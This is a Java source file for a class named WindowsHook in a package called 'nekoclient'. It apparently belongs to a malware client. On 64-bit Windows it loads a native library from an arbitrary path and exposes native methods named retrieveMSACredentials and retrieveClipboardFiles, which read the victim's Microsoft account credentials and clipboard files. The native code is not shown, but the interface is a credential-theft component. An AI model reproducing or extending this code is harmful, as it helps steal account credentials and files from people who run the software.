package dev.neko.nekoclient.api.windows;

import com.sun.jna.Platform;

public class WindowsHook {
   public static final int IPPROTO_ICMP = 1;
   public static final int IPPROTO_TCP = 6;
   public static final int IPPROTO_UDP = 17;
   public static final int IPPROTO_IDP = 22;
   public static final int IPPROTO_RDP = 27;
   private static boolean loaded = false;

   public static native byte[][] retrieveMSACredentials();

   public static native FileDescriptor[] retrieveClipboardFiles();

   public static void load(String path) {
      if (!loaded && isSupported()) {
         System.load(path);
         loaded = true;
      }
   }

   public static boolean isSupported() {
      return Platform.isWindows() && Platform.is64Bit();
   }

   public static boolean isAvailable() {
      return isSupported() && loaded;
   }
}
